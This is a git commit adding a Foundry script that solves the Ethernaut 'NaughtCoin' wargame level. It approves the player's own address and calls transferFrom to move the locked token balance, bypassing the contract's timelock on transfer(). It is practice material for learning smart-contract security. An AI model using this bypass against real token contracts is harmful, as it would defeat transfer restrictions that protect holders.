6dd0528c578fc6024f962191706ce990dcb55e14
LouisTsai <q1030176@gmail.com>
2024-01-05 16:36:51 +0800

    feat: complete 15 naughtcoin challenge

--- script/solutions/15-NaughtCoin.s.sol
+++ script/solutions/15-NaughtCoin.s.sol
@@ -5,6 +5,19 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+interface IERC20 {
+    // Events
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+    // Functions
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 value) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 value) external returns (bool);
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
+}
 
 contract NaughtCoinSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F;
@@ -15,9 +28,9 @@ contract NaughtCoinSolution is Script, EthernautHelper {
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
-        // YOUR SOLUTION HERE
-
-
+        address eoa = vm.addr(heroPrivateKey);
+        IERC20(challengeInstance).approve(eoa, IERC20(challengeInstance).balanceOf(eoa));
+        IERC20(challengeInstance).transferFrom(eoa, challengeInstance, IERC20(challengeInstance).balanceOf(eoa));
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
